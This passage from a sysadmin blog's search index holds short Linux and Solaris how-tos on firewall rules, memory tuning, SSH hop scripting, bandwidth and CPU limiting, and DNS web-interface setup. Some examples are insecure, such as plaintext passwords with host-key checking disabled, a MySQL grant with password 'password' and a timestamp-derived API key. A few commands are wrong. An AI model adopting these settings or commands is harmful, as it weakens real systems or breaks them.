tcp --dport telnet -j DROP To reject incoming packets on port 3128, often used by proxies, then add a comment:\niptables -A INPUT -p tcp --dport 3128 -j REJECT --reject-with tcp-reset -m comment --comment \"Rejecting default proxy port\" To perform automatic NAT for all packets leaving through the ppp0 interface (often representing the internet connection):\niptables -t nat -A POSTROUTING -o ppp0 -j MASQUERADE Disable all rules without disconnecting:\niptables -F \u0026\u0026 iptables -X \u0026\u0026 iptables -P INPUT ACCEPT \u0026\u0026 iptables -OUTPUT ACCEPT Resources link Firewalling under Linux Implementation of an Internet Gateway IPtables from top to bottom "
            }
        );
    index.add(
            {
                id:  252 ,
                href: "\/Debian_:_r%C3%A9installation_d%27un_serveur_presque_%C3%A0_l%27identique\/",
                title: "Debian: Reinstalling a Server Almost Identically",
                description: "How to reinstall a Debian server with the exact same packages as a reference server.",
                content: "Principle linkFrom a reference server, I want to quickly install another server with exactly the same packages.\nUsage linkWe’ll extract the list of installed packages from the reference server:\ndpkg --get-selections \u003e my_packages.txt Then reinstall everything from this package list:\ndpkg --clear-selections dpkg --set-selections \u003c my_packages.txt apt-get update apt-get dselect-upgrade apt-get dist-upgrade apt-get upgrade "
            }
        );
    index.add(
            {
                id:  253 ,
                href: "\/ACL:_Impl%C3%A9mentation_des_droits_de_type_NT_sur_Linux\/",
                title: "ACL: Implementing NT-type Permissions on Linux",
                description: "Learn how to implement NT-type permissions (ACLs) on Linux systems to extend file access control beyond traditional Unix permissions.",
                content: "An ACL, or Access Control List, is simply defined as a list of permissions on a file, directory, or tree structure, added to the “classic” permissions (technically, POSIX.1 permissions) of that file. These permissions concern defined users and/or groups. ACL management under GNU/Linux is inspired by the POSIX 1003.1e standard (project 17) but does not fully comply with it.\nWith ACLs, you can extend the number of users and groups that have rights to the same file. Remember that in the UNIX world, each file can normally only indicate permissions for a single user and a single group, which are opposed to a single category corresponding to “all others” (or “the rest of the world”). With ACLs, you can (among other things) add other users and groups to a file and define their rights separately. This brings the system closer to the permission system used on NT platforms (although many differences remain).\nACLs are very useful (and even essential) in collaborative and shared computing environments; similarly, their use with SAMBA extends its capabilities.\nHowever, be careful not to confuse them! Unix ACLs are not identical to those of NT (Microsoft). Indeed, there are variants; for example, only the owner of a file can change the owner of that file, even if other users have all rights to the file.\nIf, following this, you want to set up a Samba server and use it as under Windows with ACLs, there is a small difference in operation:\nUnder Samba, ACLs can be modified by the owner of the object, members of the group that owns the object, or the administrator of the share Under Linux, ACLs can be modified by the owner of the object or root (to simplify) Here are some useful resources:\nDocumentation on NT-type ACLs\nACL and EA under Linux\nUseful Commands linkCopy the rights from one file to another:\ngetfacl | setfacl -f - "
            }
        );
    index.add(
            {
                id:  254 ,
                href: "\/La_gestion_de_la_m%C3%A9moire_sous_Linux\/",
                title: "Linux Memory Management",
                description: "An in-depth guide to memory management in Linux, including page types, dirty/clean page reclamation, OOM handling, memory leak detection, and swap configuration.",
                content: " Software version Kernel 2.6.32+ Operating System Red Hat 6.3\nDebian 7 Website Kernel Website Last Update 06/05/2013 Pages linkWhen looking at /proc/meminfo, ‘Inactive Clean’ pages correspond to free pages. If the kernel needs to allocate pages to a process, it can take these pages from the free page list or from inactive clean. Pages being used by processes are referenced as active pages. In the case of shared memory, a page can have multiple processes referencing it.\nAs long as the page has at least one process referencing it, it will remain in the active list. When all processes have released their reference to the page, it becomes inactive. If an active page has been modified by the process that referenced it, it will become an inactive dirty page. Dirty pages contain data that can be written to disk. If the page has not been modified since the last read from disk, it will be an inactive clean page. It is then available for allocation. Free pages are pages that have not yet been allocated to a process To find dirty and clean memory:\nawk 'BEGIN {} /Shared_Clean/{ CLEAN += $2; } /Shared_Dirty/{ DIRTY += $2; } END { print \"Shared_Clean: \" CLEAN; print \"Shared_Dirty: \" DIRTY; }' /proc/1/smaps Reclaiming dirty pages linkMemory is not unlimited, so the kernel cannot keep dirty pages in RAM forever. Pages that are dirty but no longer used are flushed to disk. The kernel pdflush thread handles this task, and there are at least 2 threads minimum to handle this operation. The use of memory cache creates a strong need for control over how pages are reclaimed. To see the number of pdflush threads currently present:\n\u003e sysctl vm.nr_pdflush_threads vm.nr_pdflush_threads = 0 When flushing dirty pages to disk, the goal is to avoid IO bursts that could saturate the disk. The pdflush daemon writes data to disk in a constant and gentle manner. By default, the 2 pdflush threads will do their actions, but others can be launched (up to 8) if the 2 are saturated to ensure parallel writes on multiple disks. If the ratio of dirty pages to available RAM pages reaches a certain percentage, processes will block while pdflush synchronously writes data. There are several options to improve pdflush:\n# Percentage (total memory) of dirty pages at which pdflush should start writing vm.dirty_background_ratio= # Percentage (total memory) of dirty pages at which the process itself should start writing dirty data vm.dirty_ratio= # Interval at which pdflush will wake up (100ths/sec) (Observation time). Set to 0 to disable vm.dirty_writeback_centisecs= # Defines when data is old enough (100ths/sec) to be intercepted by pdflush (wait time). vm.dirty_expire_centisecs= If during a ps command, you can see kswap and pdflush, and these 2 elements are in state D (iowait), it’s probably caused by the kernel.\nTo commit all dirty pages and buffers:\nsync echo s \u003e /proc/sysrq-trigger Reclaiming clean pages linkThere are several ways to empty caches. To write all clean pages in the page cache to disk:\necho 1 \u003e /proc/sys/vm/drop_caches warning Be careful not to do this during production hours due to the IO it causes It is also possible to flush dentries and inodes:\necho 2 \u003e /proc/sys/vm/drop_caches To flush all clean pages, dentries and inodes:\necho 3 \u003e /proc/sys/vm/drop_caches OOM linkOOM (Out Of Memory) can happen. There is a process called oomkiller for this. When there is no more swap, no more RAM, it will kill processes. It will trigger if:\nYou have no more memory space (including RAM) There are no more available pages in the ZONE_NORMAL or ZONE_HIGHMEM1 There is no more available memory in the page mapping table It is also possible to add swap on the fly2 to avoid a crash due to an OOM.\nTo see the OOM-Kill immunity level on a process, check the process score (here PID 1):\n\u003e cat /proc/1/oom_score 0 To manually request oom-kill to launch:\necho f \u003e /proc/sysrq-trigger However, it will not kill processes if there is enough memory space. You can check the logs (messages or syslog) to see its result.\nIt’s possible to protect daemons from oom-kill this way:\necho n \u003e /proc//oom_adj n: corresponds to the score that will be multiplied by 2 info Note that oom_adj is deprecated on recent kernels. You should use /proc//oom_score_adj instead warning Just because you set a process’s OOM score doesn’t mean its children will inherit it! Be careful about this! Finally, it’s possible to disable oom-kill:\nvm.panic_on_oom=1 A small dedication to budding developers: this is not a solution to fix memory leaks!\nDetecting memory leaks linkThere are 2 types of memory leaks:\nVirtual: when a process makes requests that are not in the virtual address space (vsize)\nReal: when a process fails to free memory (RSS)\nUse sar to see system-side exchanges:\nsar -R 1 120 Use the ps command combined with watch: watch -n 1 'ps axo pid,comm,rss,vsize | grep sshd' Use Valgrind for C programs: valgrind --tool=memcheck cat /prox/$$/maps To better understand what’s happening with ps or top:\nVIRT stands for the virtual size of a process, which is the sum of memory it is actually using, memory it has mapped into itself (for instance the video card’s RAM for the X server), files on disk that have been mapped into it (most notably shared libraries), and memory shared with other processes. VIRT represents how much memory the program is able to access at the present moment.\nRES stands for the resident size, which is an accurate representation of how much actual physical memory a process is consuming. (This also corresponds directly to the %MEM column) This will virtually always be less than the VIRT size, since most programs depend on the C or other library.\nSHR indicates how much of the VIRT size is actually sharable memory or libraries. In the case of libraries, it does not necessarily mean that the entire library is resident. For example, if a program only uses a few functions in a library, the whole library is mapped and will be counted in VIRT and SHR, but only the parts of the library file containing the functions being used will actually be loaded in and be counted under RES.\nSwap linkIt is sometimes necessary to remove all pages or segments of a process from the main memory. In this case, the process will be said to be swapped, and all data belonging to it will be stored in mass memory. This can happen for processes that have been dormant for a long time, while the operating system needs to allocate memory to active processes. Code pages or segments (program) will never be swapped, but simply reassigned, as they can be found in the file corresponding to the program (the executable file). For this reason, the operating system prohibits write access to an executable file that is in use; symmetrically, it is impossible to launch the execution of a file as long as it is held open for write access by another process.3\nIt’s important to allocate enough swap to your systems, even if you have plenty of RAM. If you have multiple disks, don’t hesitate to create multiple partitions and give them equal priority at the mount level in fstab:\n[...] /dev/mapper/vg0-swap none swap sw,pri=3 0 0 /dev/mapper/vg1-swap none swap sw,pri=3 0 0 /dev/mapper/vg2-swap none swap sw,pri=3 0 0 [...] Thanks to this, the kswapd daemon will do round robin, just like a RAID 0 would to increase performance.\nHow to know what size of swap to allocate to a system? This is a rather complex question that has already generated a lot of debate. Here is a formula that works pretty well:\nRAM SWAP Between 1 and 2 GB 1.5 x the size of RAM Between 2 and 8 GB equal to the size of RAM More than 8 GB 0.75 x the size of RAM Searching for inactive pages can take CPU. On systems with a lot of RAM, searching for and unmapping inactive pages consume more disk and CPU than writing anonymous pages to disk. It is therefore possible to configure how the kernel will swap. This ranges from 0 to 100. The higher the swappiness value, the more the system is forced to swap, which reduces I/O as shown in the table below4:\nvm.swappiness value Total I/O Average Swap 0 273.57 MB/s 0 MB 20 273.75 MB/s 0 MB 40 273.52 MB/s 0 MB 60 229.01 MB/s 23068 MB 80 195.63 MB/s 25587 MB 100 184.30 MB/s 26006 MB Here’s how to modify swappiness:\nvm.swappiness=60 You should know that the kernel likes to swap anonymous pages when the % of memory mapped in the page tables + vm.swappiness \u003e= 100\nThere are also other interesting parameters to reduce wait time:\n# Number of pages the kernel will read for a page fault. This helps reduce disk head movements. Default is 2 to the power of page-cluster vm.page-cluster= # Controls for how long a process is protected from paging when there is a memory dump (in seconds) vm.swap_token_timeout= If there is little memory left, the kernel will start by killing processes in user space, starting with those that make the worst use of memory (memory access relative to the allocation that processes make).\nReferences linkMemory management and tuning options in Red Hat Enterprise Linux\nMemory addressing and allocation#UMA ↩︎\nSWAP: Creating dynamic swap2 ↩︎ ↩︎\nhttps://fr.wikipedia.org/wiki/Mémoire_virtuelle#Swapping ↩︎\nhttps://www.linuxvox.com/2009/10/what-is-the-linux-kernel-parameter-vm-swappiness/ ↩︎\n"
            }
        );
    index.add(
            {
                id:  255 ,
                href: "\/Configurer_le_r%C3%A9seau_sur_Solaris\/",
                title: "Configure Network on Solaris",
                description: "A comprehensive guide to configuring network interfaces, routes, DNS, and VIPs on Solaris systems",
                content: "Introduction linkSolaris can be challenging! Especially when you come from a Linux/BSD world and find that all the network commands are strange.\nDetecting Network Cards linkTo detect network cards that are present and especially connected, here’s a very useful command:\n$ dladm show-dev igb0 link: up speed: 1000 Mbps duplex: full igb1 link: up speed: 1000 Mbps duplex: full igb2 link: up speed: 1000 Mbps duplex: full igb3 link: up speed: 1000 Mbps duplex: full clprivnet0 link: unknown speed: 0 Mbps duplex: unknown Or you can use dladm show-links to get more detailed information about the connection status.\nFor a link aggregation (IPMP) of type 802.3ad:\n\u003e dladm show-aggr -s -i 2 1 key:1\tipackets rbytes opackets obytes %ipkts %opkts Total\t355021 531533375 60288 4944021 nxge0\t166090 249992028 0 0 46.8 0.0 nxge1\t120638 179830318 0 0 34.0 0.0 nxge4\t16 1172 25728 2109696 0.0 42.7 nxge5\t68277 101709857 34560 2834325 19.2 57.3 key:1\tipackets rbytes opackets obytes %ipkts %opkts Total\t344131 513180425 47543 3900596 nxge0\t167398 250160702 12 1672 48.6 0.0 nxge1\t95286 142041090 8 1330 27.7 0.0 nxge4\t17 1320 21601 1771571 0.0 45.4 nxge5\t81430 120977313 25922 2126023 23.7 54.5 Basic Network Configuration linkHere are some useful commands to reset a Solaris configuration, especially the network:\nifconfig -a Display interfaces with IP and MAC addresses show-devs Display peripherals prtconf -vD Display all peripherals There are two ways to reconfigure the network. The wizard and manual:\nThe wizard: sys-unconfig This will reset ALL network configuration! Reboot required sysidconfig Not tested, but also supposed to reconfigure the network And then manually, here are the files to modify: /etc/hostname.x (x corresponds to the network interface) /etc/nodename /etc/defaultrouter /etc/netmasks Dynamic Configuration linkFinally, a “reboot” or “boot net” should do the trick. However, you may not be able to reboot, so here’s the solution:\nifconfig e1000g0 plumb ifconfig e1000g0 192.168.0.1 netmask 255.255.255.0 ifconfig e1000g0 up ifconfig -a Persistent Configuration linkTo make it always active:\n192.168.0.1 broadcast + netmask 255.255.255.0 + up This is an example.\nDHCP linkHow do we set up DHCP? Very simple:\nifconfig e1000g1 dhcp start To make it permanently active, create a file:\ntouch /etc/dhcp.e1000g1 touch /etc/hostname.e1000g0 Routing linkThe folks at Sun who can’t do things like everyone else have their own route command. So to list the present routes:\nnetstat -rn And to add or delete routes:\nnetstat -rn # show current routes netstat -rnv # show current routes and their masks route add destIP gatewayIP route add destIP -netmask 255.255.0.0 gatewayIP route delete destIP gatewayIP route delete destIP -netmask 255.255.0.0 gatewayIP DNS linkYou’ll now need to define the nsswitch to add name resolution:\n... hosts: files dns ... Then edit the resolv.conf file and insert the DNS servers like this:\nnameserver 212.27.40.241 nameserver 212.27.40.240 Routes linkHere’s how to add routes. To make them persistent, add the -p option:\nroute -p add 192.168.15.0 192.168.15.1 Persistent routes are stored in /etc/inet/static_routes.\nVIP linkHere’s how to manually set up a VIP in Solaris:\nifconfig addif / up For example:\nifconfig nge1 addif 192.168.0.1/24 up Resources linkhttps://www.sunsolarisadmin.com/solaris-10/dladm-display-link-statusspeedduplexstatisticsmtu/\n"
            }
        );
    index.add(
            {
                id:  256 ,
                href: "\/Acct_Le_keyfinder_par_excellence\/",
                title: "Acct: The Ultimate Keyfinder",
                description: "Learn how to track user commands and processes with the acct tools for system auditing and monitoring.",
                content: "Introduction linkIn a production environment, it can be useful to know what each person is doing. This is particularly helpful when a mistake happens and nobody admits to it (yes, it happens). Novice hackers (aka script kiddies) who call themselves hackers because they’ve put a keylogger on a machine might also be interested in this. However, the purpose is obviously not the same.\nTwo commands are useful:\nsa: obtains statistics on process launches lastcomm: obtains a list of commands launched by users Installation linkThe installation is done as follows:\napt-get install acct Configuration link All log files will be written to this file: /var/log/account/pacct If you want to change the file, execute this action: accton FileName For activation, edit the file /etc/default/acct: # Activate acct ACCT_ENABLE=\"1\" # Amount of days that the logs are kept. ACCT_LOGGING=\"30\" Usage linklastcomm link To list the commands used: lastcomm warning Beware, you can also see what the shell executes on startup List commands recently launched by a user: lastcomm user Search in history for who launched a given command and when: lastcomm apachectl Find out which commands were launched directly from the physical terminal of the machine: lastcomm --tty tty1 sa link List commands that ran the longest: sa --sort-real-time | head List commands that consume the most I/O: sa -d | head List all commands with the user who launched them: sa -u Consumption by user: sa -m The output contains:\nNumber of calls re: time spent cp: amount of CPU consumed (in seconds) avio: average number of I/O operations (very useful for diagnosing which process is using the disk) Memory consumed per second (k, this value is not very intuitive) References linkhttps://tldp.org/HOWTO/Process-Accounting/pa.html\n"
            }
        );
    index.add(
            {
                id:  257 ,
                href: "\/Trickle_:_limit_your_application_bandwidth\/",
                title: "Trickle: Limit Your Application Bandwidth",
                description: "Guide on how to use Trickle to limit bandwidth usage for applications in Linux",
                content: " Software version 1.07 Operating System Debian 7 Website Trickle Website Last Update 06/05/2013 Introduction linktrickle is a portable lightweight userspace bandwidth shaper. It can run in collaborative mode (together with trickled) or in stand alone mode.\ntrickle works by taking advantage of the unix loader preloading. Essentially it provides, to the application, a new version of the functionality that is required to send and receive data through sockets. It then limits traffic based on delaying the sending and receiving of data over a socket. trickle runs entirely in userspace and does not require root privileges.\nInstallation link aptitude install trickle Usage linkTo use it, it’s really easy. Simply add a command prefix with desired max bandwidth:\ntrickled -u 10 -d 20 firefox Here, the maximum upload is set to 10k and upload to 20k.\n"
            }
        );
    index.add(
            {
                id:  258 ,
                href: "\/Cpulimit:_limit_CPU_usage\/",
                title: "Cpulimit: Limit CPU Usage",
                description: "Learn how to limit CPU usage for processes in Linux using Cpulimit tool. This guide covers installation, usage examples and best practices.",
                content: " Software version 1.7 Operating System Debian 7 Website Cpulimit Website Last Update 06/05/2013 Introduction linkCpulimit1 is a tool which limits the CPU usage of a process (expressed in percentage, not in CPU time). It is useful to control batch jobs, when you don’t want them to eat too many CPU cycles. The goal is prevent a process from running for more than a specified time ratio. It does not change the nice value or other scheduling priority settings, but the real CPU usage. Also, it is able to adapt itself to the overall system load, dynamically and quickly.\nThe control of the used cpu amount is done sending SIGSTOP and SIGCONT POSIX signals to processes. All the children processes and threads of the specified process will share the same percent of CPU.\nInstallation link aptitude install cpulimit Usage linkIt’s really easy to use it. If you want for example limit a PID to 40% of CPU:\ncpulimit -p 1234 -l 40 This will limit 40% of one core on the PID 1234. You can also do it directly on a binary:\ncpulimit -l 40 app Other case could be found in the man. But the idea is clear…limiting the CPU of one app.\nReferences link https://github.com/opsengine/cpulimit ↩︎\n"
            }
        );
    index.add(
            {
                id:  259 ,
                href: "\/Belier_:_script_your_SSH_connection\/",
                title: "Belier: Script Your SSH Connection",
                description: "How to use Belier to simplify complex SSH connections through multiple intermediate servers",
                content: " Software version 1.2 Operating System Debian 7 Website Belier Website Last Update 06/05/2013 Introduction linkBelier1 allows opening a shell or executing a command on a remote computer through an SSH connection. The main feature of Belier is its ability to cross several intermediate computers before completing the job.\nBelier reaches the final computer through intermediate machines. You can execute commands with any account available on the remote computer. It is possible to switch accounts on intermediate computers before accessing the final computer. You can open a data tunnel through every host you cross to the final host. Belier generates one script for each final computer to reach. Belier aims to give a single system administrator a tool to work independently, without requiring modification of the computers they need to cross, just using the current configurations of every machine they have to work with. So it’s not a revolutionary tool, but it helps to be productive quickly.\nFor instance, here is what is possible to do with it:\n2\nInstallation linkTo install it, as usual it’s easy on Debian:\naptitude install belier Configuration linkThe configuration is really simple. Type line by line in a ‘connection’ file, connection information for:\nThe server name or IP The username The password It should look like this:\nserver1_bound username password server2_bound username password server3_bound username password final_server username password Then generate an automatic shell connection script with Belier:\nbel -e ~/connection You should now have a script containing all the commands to quickly connect to your desired server:\n#!/usr/bin/expect -f set timeout 10 spawn ssh -o NoHostAuthenticationForLocalhost=yes -o StrictHostKeyChecking=no server1_bound expect -re \"(%|#|\\$) $\" send -- \"su - username\\r\" expect \":\" send -- \"password\\r\" expect -re \"(%|#|\\$) $\" send -- \"ssh -o NoHostAuthenticationForLocalhost=yes -o StrictHostKeyChecking=no server2_bound\\r\" expect -re \"(%|#|\\$) $\" send -- \"su - username\\r\" expect \":\" send -- \"password\\r\" expect -re \"(%|#|\\$) $\" send -- \"ssh -o NoHostAuthenticationForLocalhost=yes -o StrictHostKeyChecking=no server3_bound\\r\" expect -re \"(%|#|\\$) $\" send -- \"su - username\\r\" expect \":\" send -- \"password\\r\" expect -re \"(%|#|\\$) $\" send -- \"ssh -o NoHostAuthenticationForLocalhost=yes -o StrictHostKeyChecking=no final_server\\r\" expect -re \"(%|#|\\$) $\" send -- \"su - username\\r\" expect \":\" send -- \"password\\r\" expect -re \"(%|#|\\$) $\" interact +++ return You can now launch the command with final_server.sh :-)\nhttp://www.ohmytux.com/belier/ ↩︎\nhttp://carlchenet.wordpress.com/?p=22 ↩︎\n"
            }
        );
    index.add(
            {
                id:  260 ,
                href: "\/Lancement_d%27une_commande_%C3%A0_la_r%C3%A9ception_d%27un_mail\/",
                title: "Running a Command When Receiving an Email",
                description: "How to execute commands or scripts automatically when receiving emails on a Linux system.",
                content: "Introduction linkThere’s a very useful feature that can be easily implemented: launching a command or script when receiving an email.\nUsage linkSending an Email linkYou can send an email in the following way:\necho \"body\" | mail -s \"subject\" test@test.com If you want to add an attachment:\nmailx bar@foo.com -s \"HTML Hello\" -a \"Content-Type: text/html\" \u003c body.htm Or for a binary attachment:\nuuencode archive.tar.gz archive.tar.gz | mail -s \"Emailing: archive.tar.gz\" user@example.com Receiving an Email linkTo use this procedure, edit the aliases configuration and add a line like this (/etc/aliases):\ntest: \"|touch /tmp/test\" When you send an email to your server with the recipient test (e.g. test@fqdn), the touch command will be executed.\nNote: Don’t forget to run newaliases after making changes.\n"
            }
        );
    index.add(
            {
                id:  261 ,
                href: "\/Http_substitutions_filter_:_multiple_filters_with_regex_on_response_bodies\/",
                title: "HTTP Substitutions Filter: Multiple Filters with Regex on Response Bodies",
                description: "Learn how to implement HTTP substitutions filter for Nginx to perform multiple regex filters on response bodies. This guide covers compilation, installation, and configuration on Debian systems.",
                content: " Software version 1.2.1 Operating System Debian 7 Website nginx_substitutions_filter Website Last Update 26/04/2013 Introduction linknginx_substitutions_filter is a filter module which can do both regular expression and fixed string substitutions on response bodies. This module is quite different from the Nginx’s native Substitution Module. It scans the output chains buffer and matches string line by line, just like Apache’s mod_substitute.1\nI’ve played with classic substitution module but due to limitations (only one pattern, no regex), it wasn’t easy to do all I wanted to do. That’s why I’ve searched a better module and to add it on my Debian server. Unfortunately, it’s not currently available in Nginx packages on Debian. That’s why I needed to create new packages with it built in.\nTo get a quick understand of what this module is able to do, we’re going to take an example. Let’s say we need to add a CSS style on every pages on our website. You’ve got multiple solution to do it and most of them need to modify the application code. The problem is, each time you will get an application upgrade, you’ll need to think about this modifications. The other solution (if possible) is to create an extension for you application, but it’s boring to manage.\nWith that solution, you can change the end of the head banner and add any style or JS that you want. It works with everything in fact. As described, it’s a string replacement solution. This extension is really powerfull. I’ll explain in the next days how I use it for my own usage.\nPrerequisites linkWe first need to download package source and install all dependencies to recompile Nginx:\nmkdir ~/nginx_new ; cd ~/nginx_new aptitude install devscripts dch apt-get build-dep nginx-extras apt-get source nginx-extras As I use nginx-extras package, I take this one but you can take only nginx if you want.\nCompilation linkNow let’s get sources from the official site:\ncd ~/nginx_new/nginx-1.2.1/debian/modules/ git clone git://github.com/yaoweibin/ngx_http_substitutions_filter_module.git Then add this line to make it compiled on the next step (~/nginx_new/nginx-1.2.1/debian/rules):\nconfig.status.extras: config.env.extras config.sub config.guess cd $(BUILDDIR_extras) \u0026\u0026 CFLAGS=\"$(CFLAGS)\" CORE_LINK=\"$(LDFLAGS)\" ./configure \\ --prefix=/etc/nginx \\ --conf-path=/etc/nginx/nginx.conf \\ --error-log-path=/var/log/nginx/error.log \\ --http-client-body-temp-path=/var/lib/nginx/body \\ --http-fastcgi-temp-path=/var/lib/nginx/fastcgi \\ --http-log-path=/var/log/nginx/access.log \\ --http-proxy-temp-path=/var/lib/nginx/proxy \\ --http-scgi-temp-path=/var/lib/nginx/scgi \\ --http-uwsgi-temp-path=/var/lib/nginx/uwsgi \\ --lock-path=/var/lock/nginx.lock \\ --pid-path=/var/run/nginx.pid \\ --with-pcre-jit \\ --with-debug \\ --with-http_addition_module \\ --with-http_dav_module \\ --with-http_flv_module \\ --with-http_geoip_module \\ --with-http_gzip_static_module \\ --with-http_image_filter_module \\ --with-http_mp4_module \\ --with-http_perl_module \\ --with-http_random_index_module \\ --with-http_realip_module \\ --with-http_secure_link_module \\ --with-http_stub_status_module \\ --with-http_ssl_module \\ --with-http_sub_module \\ --with-http_xslt_module \\ --with-ipv6 \\ --with-sha1=/usr/include/openssl \\ --with-md5=/usr/include/openssl \\ --with-mail \\ --with-mail_ssl_module \\ --add-module=$(MODULESDIR)/nginx-auth-pam \\ --add-module=$(MODULESDIR)/chunkin-nginx-module \\ --add-module=$(MODULESDIR)/headers-more-nginx-module \\ --add-module=$(MODULESDIR)/nginx-development-kit \\ --add-module=$(MODULESDIR)/nginx-echo \\ --add-module=$(MODULESDIR)/nginx-http-push \\ --add-module=$(MODULESDIR)/nginx-lua \\ --add-module=$(MODULESDIR)/nginx-upload-module \\ --add-module=$(MODULESDIR)/nginx-upload-progress \\ --add-module=$(MODULESDIR)/ngx_http_substitutions_filter_module \\ --add-module=$(MODULESDIR)/nginx-upstream-fair \\ --add-module=$(MODULESDIR)/nginx-dav-ext-module \\ $(CONFIGURE_OPTS) \u003e$@ touch $@ dch -l local 'New version with nginx_substitutions_filter included' Now you’re ready to compile and package it automatically:\ncd ../.. debuild -us -uc Installation linkNow it’s easy, let’s install:\ncd ~/nginx_new dpkg -i nginx-extras_1.2.1-2.2local1_amd64.deb nginx-common_1.2.1-2.2local1_all.deb Configuration linkLet’s take the default configuration for instance and then add to your location this kind of string replacements:\n[...] location / { # First attempt to serve request as file, then # as directory, then fall back to displaying a 404. try_files $uri $uri/ /index.html; subs_filter_types text/html text/css text/xml; subs_filter st(\\d*).example.com $1.example.com ir; subs_filter a.example.com s.example.com; # Uncomment to enable naxsi on this location # include /etc/nginx/naxsi.rules } [...] As you can see, regex works and simple remplacement strings works as well.\nReferences link https://github.com/yaoweibin/ngx_http_substitutions_filter_module ↩︎\n"
            }
        );
    index.add(
            {
                id:  262 ,
                href: "\/NamedManager_:_une_interface_web_agr%C3%A9able_pour_administrer_Bind\/",
                title: "NamedManager: A Nice Web Interface to Manage Bind",
                description: "A guide on setting up NamedManager, a web interface for managing your Bind DNS server with features like automatic PTR record creation and centralized DNS management.",
                content: " Software version 1.5.1 Operating System Debian 7 Website Namedmanager Website Last Update 14/04/2013 Introduction linkNamedmanager1 is a graphical interface for managing your DNS records. It has been thoughtfully designed to facilitate administration, such as automatically adding PTR records when an A record is created, with a simple checkbox.\nThe interface can also manage multiple DNS servers and centralize their logs.\nPrerequisites linkWe will need several components. I have chosen:\nWeb server: Nginx with SSL + PHP-FPM Database: MariaDB Nginx linkFor installation on Debian, it’s always simple:\naptitude install nginx Then we’ll start it:\n/etc/init.d/nginx start SSL linkFirst, let’s generate SSL keys:\nmkdir -p /etc/nginx/ssl cd /etc/nginx/ssl openssl req -new -x509 -nodes -out server.crt -keyout server.key Then we’ll modify our Nginx configuration (adapt it to your needs):\nserver { listen 443; ssl on; ssl_certificate /etc/nginx/ssl/server.crt; ssl_certificate_key /etc/nginx/ssl/server.key; ssl_session_timeout 5m; access_log /var/log/nginx/dns.access.log; server_name dns.deimos.fr; root /usr/share/nginx/www; index index.php; location / { try_files $uri $uri/ /index.html; } # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000 # location ~ \\.php$ { fastcgi_pass unix:/var/run/php5-fpm.sock; fastcgi_index index.php; include fastcgi_params; } } PHP-FPM link aptitude install php5-fpm MariaDB linkTo install MariaDB, it’s unfortunately not embedded in Debian, so we’ll add a repository. First of all, install a python tool to get aptkey:\naptitude install python-software-properties Then let’s add this repository (https://downloads.mariadb.org/mariadb/repositories/):\napt-key adv --recv-keys --keyserver keyserver.ubuntu.com 0xcbcb082a1bb943db add-apt-repository 'deb http://mirrors.linsrv.net/mariadb/repo/10.0/debian wheezy main' We’re now going to change apt pinning to prioritize MariaDB’s repository:\nPackage: * Pin: release o=MariaDB Pin-Priority: 1000 And now let’s install MariaDB:\naptitude update aptitude install mariadb-server Then we’ll add the last necessary packages:\naptitude install php5-cli php5-mysql Installation link info If your DNS server is on the same machine as the graphical interface, you’ll need to install it: aptitude install bind9 We’ll need these utilities to make the web interface work:\naptitude install bind9utils php-soap Let’s download the latest version, then extract it:\ncd /tmp wget https://projects.jethrocarr.com/p/oss-namedmanager/downloads/get/namedmanager-1.5.1.tar.bz2 tar -xjf namedmanager-1.5.1.tar.bz2 cd namedmanager-1.5.1 We’ll set up the tools for integration with bind:\nmkdir /usr/share/namedmanager cp -Rf bind /usr/share/namedmanager cp /usr/share/namedmanager/bind/include/{sample-config.php,config-settings.php} mkdir /etc/namedmanager ln -s /usr/share/namedmanager/bind/include/config-settings.php /etc/namedmanager/config-bind.php Then the crontab:\ncp resources/namedmanager-bind.cron /etc/cron.d/namedmanager-bind We’ll also set up a logpush service that will allow us to centralize logs:\ncp resources/namedmanager_logpush.rcsysinit /etc/init.d/namedmanager_logpush update-rc.d -f namedmanager_logpush defaults Finally, we create the necessary files for the proper functioning of the web interface by assigning the correct permissions:\ntouch /etc/bind/named.namedmanager.conf mkdir /etc/bind/zones chown www-data:bind /etc/bind/named.namedmanager.conf /etc/bind/zones chmod 775 /etc/bind/named.namedmanager.conf /etc/bind/zones Configuration linkDatabase linkNow, let’s initialize the database:\nmysql -uroot -p \u003c sql/version_20121208_install.sql warning Unlike classic imports, this one creates the database called ’namedmanager’ at the same time and set the right permissions (adjust according to your needs):\nGRANT USAGE ON * . * TO 'namedmanager'@'%' IDENTIFIED BY 'password'; GRANT SELECT , INSERT , UPDATE , DELETE , CREATE , DROP , INDEX , ALTER , CREATE TEMPORARY TABLES, LOCK TABLES ON `namedmanager` . * TO 'namedmanager'@'%'; flush privileges; Web Server linkWe’ll now take care of the web part. Personally, I have a dedicated machine to manage my DNS on which I don’t want virtualhosts. So I put everything at the root of my server, but you don’t have to do like me either. Then we’ll create the configuration file and put it in /etc:\ncp -Rf htdocs/* /usr/share/nginx/www/ chown -Rf www-data. /usr/share/nginx/www/ cp htdocs/include/sample-config.php /usr/share/nginx/www/include/config-settings.php ln -s /usr/share/nginx/www/include/config-settings.php /etc/namedmanager/config.php Edit your configuration to have the correct database information:\n[...] /* Database Configuration */ $config[\"db_host\"] = \"localhost\"; // hostname of the MySQL server $config[\"db_name\"] = \"namedmanager\"; // database name $config[\"db_user\"] = \"namedmanager\"; // MySQL user $config[\"db_pass\"] = \"password\"; // MySQL password (if any) [...] Before moving on, it’s time to restart all the services that have been modified:\nservice php5-fpm restart service nginx restart service cron restart Bind and API Key linkWe’ll integrate the NamedManager configuration with Bind:\n// This is the primary configuration file for the BIND DNS server named. // // Please read /usr/share/doc/bind9/README.Debian.gz for information on the // structure of BIND configuration files in Debian, *BEFORE* you customize // this configuration file. // // If you are just adding zones, please do that in /etc/bind/named.conf.local include \"/etc/bind/named.conf.options\"; include \"/etc/bind/named.conf.local\"; include \"/etc/bind/named.conf.default-zones\"; include \"/etc/bind/named.namedmanager.conf\"; Then restart Bind.\nLet’s generate an API key (you can use the method you want or do like me):\n\u003e date +%s | sha256sum | base64 | head -c 32 ; echo YmI3ZGRlYWY3NTk4ZDAzMGJmYWE1NDdh Then edit the following configuration file and adapt it to your needs:\n\u003c?php /* Sample Configuration File Copy this file to config-settings.php This file should be read-only to the user whom the bind configuration scripts are running as. */ /* API Configuration */ $config[\"api_url\"] = \"https://dns.deimos.fr\"; // Application Install Location $config[\"api_server_name\"] = \"dns.deimos.fr\"; // Name of the DNS server (important: part of the authentication process) $config[\"api_auth_key\"] = \"YmI3ZGRlYWY3NTk4ZDAzMGJmYWE1NDdh\"; 